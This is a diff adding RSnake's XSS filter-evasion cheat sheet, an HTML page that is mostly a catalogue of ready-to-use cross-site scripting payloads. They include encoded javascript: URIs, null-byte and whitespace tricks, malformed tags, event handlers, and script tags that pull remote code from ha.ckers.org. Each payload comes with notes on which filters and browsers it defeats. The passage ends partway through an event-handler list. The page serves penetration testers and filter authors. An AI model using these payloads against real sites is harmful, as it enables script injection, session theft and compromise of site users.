@@ -1,0 +1,786 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML>
+  <HEAD>
+   <TITLE>XSS (Cross Site Scripting) Cheat Sheet</TITLE>
+   <LINK REL="Shortcut Icon" href="http://ha.ckers.org/favicon.ico">
+   <LINK REL="StyleSheet" HREF="http://ha.ckers.org/ha.ckers.org.css">
+   <LINK REL="alternate" type="application/rss+xml" title="ha.ckers.org web application security lab RSS Feed" href="http://ha.ckers.org/blog/feed/" />
+   <META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-8">
+   <META NAME="description" CONTENT="XSS (Cross Site Scripting) Cheat Sheet: Esp: for filter evasion - by RSnake">
+   <script src="http://ha.ckers.org/xssscript.js"></script>
+   <META NAME="keywords" CONTENT="XSS, cross site scripting, filter evasion, encode, attack vector, javascript, vbscript, event handlers, security, hacking, RSnake, session riding, CSRF">
+  </HEAD>
+  <BODY>
+    <DIV ALIGN="CENTER">
+    </DIV>
+    <TABLE CELLPADDING="0" CELLSPACING="0" ALIGN="center">
+      <TR>
+        <TD WIDTH="450"><A HREF="http://ha.ckers.org/"><IMG SRC="http://ha.ckers.org/images/84844372/rsnake/hackers.jpg" width="450" height="100" border="0"></A></TD>
+      </TR>
+      <TR>
+        <TD WIDTH="445" STYLE="padding-left:5;padding-top:5">
+<center><H2>XSS (Cross Site Scripting) Cheat Sheet<BR>Esp: for filter evasion</H2></center><BR>
+
+By <A HREF="mailto:h@ckers.org?subject=~rsnake/xss.html">RSnake</A><BR><BR>
+
+Note from the author: XSS is Cross Site Scripting. If you don't know how XSS (Cross Site Scripting) works, this page probably won't help you. This page is for people who already understand the basics of XSS attacks but want a deep understanding of the nuances regarding filter evasion.  This page will also not show you how to mitigate XSS vectors or how to write the actual cookie/credential stealing/replay/session riding portion of the attack.  It will simply show the underlying methodology and you can infer the rest.  Also, please note my XSS page has been replicated by the <A HREF="http://www.owasp.org/">OWASP 2.0 Guide</A> in the Appendix section with my permission.  However, because this is a living document I suggest you continue to use this site to stay up to date.
+
+<BR><BR>Also, please note that most of these cross site scripting vectors have been tested in the browsers listed at the bottom of the page, however, if you have specific concerns about outdated or obscure versions please download them from <A HREF="http://browsers.evolt.org">Evolt</A>.  Please see the <A HREF="http://ha.ckers.org/xssAttacks.xml">XML format of the XSS Cheat Sheet</A> if you intend to use <A HREF="http://www.owasp.org/index.php/Category:OWASP_CAL9000_Project">CAL9000</A> or other automated tools.  If you have an RSS reader feel free to subscribe to the Web Application Security RSS feed below, or join the <A HREF="http://sla.ckers.org/forum/">forum</A>:<BR><BR>
+
+<DIV ALIGN="CENTER"><A HREF="http://ha.ckers.org/blog/feed/"><IMG SRC="/images/xml.gif" border="0" ALT="Web Application Security RSS feed"></A></DIV>
+<BR><BR>
+
+<B>XSS (Cross Site Scripting):</B><UL>
+
+<A NAME="XSSlocator">XSS locator</A>.  Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word "XSS" will pop up.  Use the <A HREF="#XSScalc">URL encoding calculator</A> below to encode the entire string.  Tip: if you're in a rush and need to quickly check a page, often times injecting the depreciated "&lt;PLAINTEXT&gt;" tag will be enough to check to see if something is vulnerable to XSS by messing up the output appreciably:<BR>
+<TEXTAREA COLS=45 ROWS=3>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSSlocator2">XSS locator 2</A>.  If you don't have much space and know there is no vulnerable JavaScript on the page, this string is a nice compact XSS injection check.  View source after injecting it and look for &lt;XSS verses &amp;lt;XSS to see if it is vulnerable:<BR>
+<TEXTAREA COLS=45 ROWS=3>'';!--"&lt;XSS&gt;=&amp;{()}</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_No_filter_evasion">No filter evasion</A>.  This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Image_XSS">Image XSS</A> using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well - I'll probably revise this at a later date):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC="javascript:alert('XSS');"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_No_quotes_no_semicolon">No quotes and no semicolon</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC=javascript:alert('XSS')&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Case_insensitive">Case insensitive</A> XSS attack vector:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_HTML_entities">HTML entities</A> (the semicolons are required for this to work):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Grave_accents">Grave accent</A> obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Malformed_IMG_tags">Malformed IMG tags</A>.  Originally found by <A HREF="http://www.begeek.it/2006/03/18/esclusivo-vulnerabilita-xss-in-firefox/#more-300">Begeek</A> (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.  I assume this was originally meant to correct sloppy coding.  This would make it significantly more difficult to correctly parse apart an HTML tag:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_fromCharCode">fromCharCode</A> (if no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need). Click <A HREF="http://www.wocares.com/noquote.php">here</A> to build your own (thanks to Hannes Leopold):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_UTF-8_Unicode">UTF-8 Unicode</A> encoding (all of the XSS examples that use a javascript: directive inside of an &lt;IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).  Use the <A HREF="#XSScalc">XSS calculator</A> for more information:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Long_UTF-8_Unicode">Long UTF-8 Unicode</A> encoding without semicolons (this is often effective in XSS that attempts to look for "&amp;#XX;", since most people don't know about padding - up to 7 numeric characters total).  This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Hex_encoding">Hex encoding</A> without semicolons (this is also a viable XSS attack against the above string $tmp_string =~ s/.*\&#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).  Use the <A HREF="#XSScalc">XSS calculator</A> for more information:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Embedded_tab">Embedded tab</A> to break up the cross site scripting attack:
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC="jav&#x09;ascript:alert('XSS');"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Embedded_encoded_tab">Embedded encoded tab</A> to break up XSS:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Embeded_newline">Embeded newline</A> to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack.  That is incorrect.  Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work.  See the <A HREF="ascii.html">ascii chart</A> for more details.  The following four XSS examples illustrate this vector:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Embedded_carriage_return">Embedded carriage return</A> to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted.  Often I've seen filters that assume the hex and dec encoding has to be two or three characters.  The real rule is 1-7 characters.):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Multiline">Multiline</A> Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector) these are not spaces just one of the three characters as described above:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG&#x0D;SRC&#x0D;=&#x0D;"&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;'&#x0D;X&#x0D;S&#x0D;S&#x0D;'&#x0D;)&#x0D;"&#x0D;>&#x0D;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Null">Null</A> breaks up JavaScript directive. Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like <A HREF="http://www.portswigger.net/proxy/">Burp Proxy</a> or use %00 in the URL string or if you want to write your own injection tool you can either use <A HREF="http://www.vim.org/">vim</A> (^V^@ will produce a null) or the following program to generate it into a text file.  Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char).  But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example:<BR>
+<TEXTAREA COLS=45 ROWS=3>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Null_2">Null</A> breaks up cross site scripting vector. Here is a little known XSS attack vector using null characters.  You can actually break up the HTML itself using the same nulls as shown above.  I've seen this vector bypass some of the most restrictive XSS filters to date:<BR>
+<TEXTAREA COLS=45 ROWS=3>perl -e 'print "&lt;SCR\0IPT&gt;alert(\"XSS\")&lt;/SCR\0IPT&gt;";' &gt; out</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Spaces_meta_chars">Spaces and meta chars</A> before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word "javascript:" -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the "javascript:" keyword.  The actual reality is you can have any char from 1-32 in decimal):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Non_alpha_non_digit">Non-alpha-non-digit</A> XSS.  While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag.  The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.  For example "&lt;SCRIPT\s" != "&lt;SCRIPT/XSS\s":<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Non_alpha_non_digit2">Non-alpha-non-digit part 2</A> XSS. yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer.  The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks.  Note that this also applies to the grave accent char as seen here:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Non_alpha_non_digit3">Non-alpha-non-digit part 3</A> XSS.  <A HREF="http://www.watchfire.com">Yair Amit</A> brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces.  This could be useful if the system does not allow spaces.<BR> 
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT/SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Extraneous open brackets">Extraneous open brackets</A>.  Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like <A HREF="http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/">Boyer-Moore</A> that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_No_closing_script_tags">No closing script tags</A>.  In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the "&gt;&lt;/SCRIPT&gt" portion of this Cross Site Scripting vector.  Firefox assumes it's safe to close the HTML tag and add closing tags for you.  How thoughtful!  Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it.  You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt;B&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Protocol_resolution">Protocol resolution in script tags</A>.  This particular variant was submitted by <A HREF="http://www.pilorz.net/">&#321;ukasz Pilorz</A> and was based partially off of Ozh's protocol resolution bypass below.  This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a &lt;/SCRIPT&gt; tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better.  The ".j" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Half_open">Half open</A> HTML/JavaScript XSS vector.  Unlike Firefox the IE rendering engine doesn't add extra data to your page, but it does allow the javascript: directive in images.  This is useful as a vector because it doesn't require a close angle bracket.  This assumes there is any HTML tag below where you are injecting this cross site scripting vector.  Even though there is no close "&gt;" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it.  It gets around <A HREF="http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt">the following NIDS regex</A>: /((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ because it doesn't require the end "&gt;".  As a side note, this was also affective against a real world XSS filter I came across using an open ended &lt;IFRAME tag instead of an &lt;IMG tag:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC="javascript:alert('XSS')"</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Double_open">Double open</A> angle brackets.  This is an odd one that <A HREF="http://www.mitre.org">Steven Christey</A> brought to my attention.  At first I misclassified this as the same XSS vector as above but it's surprisingly different.  Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering.  Without it, Firefox will work but Netscape won't:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+
+<A NAME="XSS_no_single_double_quotes_semicolon">XSS with no single quotes or double quotes or semicolons</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;SCRIPT&gt;a=/XSS/
+alert(a.source)&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Escaping_JS_escapes">Escaping JavaScript escapes</A>.  When the application is written to output some user information inside of a JavaScript like the following: &lt;SCRIPT&gt;var a="$ENV{QUERY_STRING}";&lt;/SCRIPT&gt; and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character.  When this is gets injected it will read &lt;SCRIPT&gt;var a="\\";alert('XSS');//";&lt;/SCRIPT&gt; which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire.  The <A HREF="#XSSlocator">XSS locator</A> uses this method.:<BR>
+<TEXTAREA COLS=45 ROWS=3>\";alert('XSS');//</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_End_title_tag">End title tag</A>.  This is a simple XSS vector that closes &lt;TITLE&gt; tags, which can encapsulate the malicious cross site scripting attack:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_INPUT_image">INPUT image</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_BODY_image">BODY image</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_BODY_tag">BODY tag</A> (I like this method because it doesn't require using any variants of "javascript:" or "&lt;SCRIPT..." to accomplish the XSS attack).  <A HREF="http://x10security.org/">Dan Crowley</A> additionally noted that you can put a space before the equals sign ("onload=" != "onload ="):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;BODY ONLOAD=alert('XSS')&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Event_handlers">Event Handlers</A> that can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing).  Please note I have excluded browser support from this section because each one may have different results in different browsers.  Thanks to <A HREF="http://www.secaron.de/">Rene Ledosquet</A> for the HTML+TIME updates:<BR>
+<TEXTAREA COLS=45 ROWS=3>
+1.	FSCommand() (attacker can use this when executed from within an embedded Flash object)
+2.	onAbort() (when user aborts the loading of an image)
+3.	onActivate() (when object is set as the active element)
+4.	onAfterPrint() (activates after user prints or previews print job)
+5.	onAfterUpdate() (activates on data object after updating data in the source object)
+6.	onBeforeActivate() (fires before the object is set as the active element)
+7.	onBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the execCommand("Copy") function)
+8.	onBeforeCut() (attacker executes the attack string right before a selection is cut)
+9.	onBeforeDeactivate() (fires right after the activeElement is changed from the current object)
+10.	onBeforeEditFocus() (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
+11.	onBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand("Paste") function)
+12.	onBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand("Print") function).
+13.	onBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
+14.	onBegin() (the onbegin event fires immediately when the element's timeline begins)
